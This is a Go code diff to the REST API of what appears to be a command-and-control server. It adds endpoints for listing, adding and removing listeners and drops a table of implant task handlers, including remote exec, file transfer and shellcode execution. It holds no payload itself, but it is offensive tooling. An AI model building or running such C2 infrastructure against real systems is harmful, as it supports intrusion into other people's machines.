@@ -10,24 +10,15 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
-var taskTypeToHandlerFunc = map[int]func(c *gin.Context, implant string) error{
-	5:  addImplantKill,
-	7:  addChangeConfig,
-	11: addFileInfo,
-	13: addLs,
-	15: addExec,
-	17: addCd,
-	19: addDownload,
-	21: addUpload,
-	23: addShellcodeExec,
-}
-
 func Init() {
 	gin.SetMode(gin.DebugMode)
 	router := gin.New()
 	gin.LoggerWithWriter(log.Writer())
 
 	router.GET("/implants", getImplants)
+	router.GET("/listeners", getRunningListeners)
+	router.POST("listeners/add", postAddListener)
+	router.POST("listeners/remove", postRemoveListener)
 	router.GET("/tasks", getTasks)
 	router.POST("/tasks/add", postAddTask)
 	go router.Run("0.0.0.0:7331")
@@ -44,6 +35,74 @@ func getImplants(c *gin.Context) {
 		return
 	}
 	c.JSON(200, implants)
+}
+
+func getRunningListeners(c *gin.Context) {
+	listeners, err := api.GetRunningListeners()
+	if err != nil { //only error that can be thrown is no listeners are running
+		emptyResp := make([]string, 0)
+		c.JSON(200, emptyResp)
+		return
+	}
+
+	//Since the listener.Listener struct contains field types that cannot be JSONized, we filter those types out with an anonymous struct
+	type listenerResponse struct {
+		Type    string
+		Network string
+		Port    int
+	}
+
+	var restResponse []listenerResponse
+	for _, listener := range *listeners {
+		restResponse = append(restResponse, listenerResponse{
+			Type:    listener.Type,
+			Network: listener.Network,
+			Port:    listener.Port,
+		})
+	}
+
+	c.JSON(200, restResponse)
+}
+
+func postAddListener(c *gin.Context) {
+	network := c.PostForm("network")
+	portStr := c.PostForm("port")
+
+	if portStr == "" {
+		c.AbortWithStatusJSON(400, gin.H{"error": "port parameter should be a valid integer"})
+		return
+	}
+	port, err := strconv.Atoi(portStr)
+	if err != nil {
+		c.AbortWithStatusJSON(400, gin.H{"error": "port parameter should be a valid integer"})
+		return
+	}
+
+	err = api.AddListener(network, port)
+	if err != nil {
+		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
+		return
+	}
+
+	c.JSON(200, gin.H{"success": true})
+}
+
+func postRemoveListener(c *gin.Context) {
+	idStr := c.PostForm("id")
+
+	id, err := strconv.Atoi(idStr)
+	if err != nil {
+		c.AbortWithStatusJSON(400, gin.H{"error": "id parameter should be a valid integer"})
+		return
+	}
+
+	err = api.KillListener(id)
+	if err != nil {
+		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
+		return
+	}
+
+	c.JSON(200, gin.H{"success": true})
 }
 
 func getTasks(c *gin.Context) {
@@ -75,7 +134,7 @@ func postAddTask(c *gin.Context) {
 	}
 	taskType, err := strconv.Atoi(taskTypeStr)
 	if err != nil {
-		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
+		c.AbortWithStatusJSON(400, gin.H{"error": "taskType parameter should be a valid integer"})
 		return
 	}
 
